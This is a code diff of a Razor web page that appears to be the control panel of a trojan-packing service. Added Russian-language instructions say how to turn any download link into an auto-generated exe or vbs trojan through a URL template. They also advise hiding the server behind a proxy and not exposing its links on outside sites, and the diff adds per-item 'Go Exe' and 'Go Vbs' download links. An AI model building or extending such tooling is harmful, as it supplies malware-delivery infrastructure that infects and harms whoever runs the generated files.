@@ -2,6 +2,19 @@
 
 <div>
     <li>Pack Any Link to Troyan</li>
+
+    <hr/>
+    <li>Используйте адрес вида: @Model.PackTemplateUrl?type=exe&url=http://yandex.ru/file.txt</li>
+    <li>Параметры</li>
+    <li>type - exe or vbs</li>
+    <li>url - конечный файл</li>
+    <li>icon - Иконка [Under construction]</li>
+    <li>Троян будет сгененирован автоматически при первом обращание</li>
+    <li></li>
+    Лучше добавить ссылки через форму ниже что бы система знала и обнавляла трояны автоматически
+    <li></li>
+    <li>Не используйте ссылки на сервер на вненших сайтах</li>
+    <li>Скачивайте файлы или используйте php proxy script [Under construction]</li>
 </div>
 
 <hr/>
@@ -23,12 +36,7 @@
                 <label>OriginalUrl</label>
                 <input type="text" name="Items[@i].OriginalUrl" value="@Model.Items[i].OriginalUrl" class="form-control" placeholder="OriginalUrl"/>
                 <span asp-validation-for="Items[@i].OriginalUrl" class="text-danger"></span>
-
-                <label>Url</label>
-                <input type="text" name="Items[@i].Url" value="@Model.Items[i].Url" class="form-control" placeholder="Url"/>
-                <span asp-validation-for="Items[@i].Url" class="text-danger"></span>
-
-
+                
                 <label>Date</label>
                 <input type="text" name="Items[@i].Date" value="@Model.Items[i].Date" class="form-control" placeholder="Date"/>
                 <span asp-validation-for="Items[@i].Date" class="text-danger"></span>
@@ -38,10 +46,11 @@
                 </label>
                 <span asp-validation-for="Items[@i].Enabled" class="text-danger"></span>
 
-            </div>
+                <a target="_blank" href='@(Model.Items[i].UrlExe)'>Go Exe</a>
+                <a target="_blank" href='@(Model.Items[i].UrlVbs)'>Go Vbs</a>
+                <button type="button" class="btn btn-danger btn-remove" onclick="removeRow(this)">Remove</button>
 
-            <button type="button" class="btn btn-primary btn-primary" onclick="manageRow(this)">Go Url</button>
-            <button type="button" class="btn btn-danger btn-remove" onclick="removeRow(this)">Remove</button>
+            </div>
         }
 
 
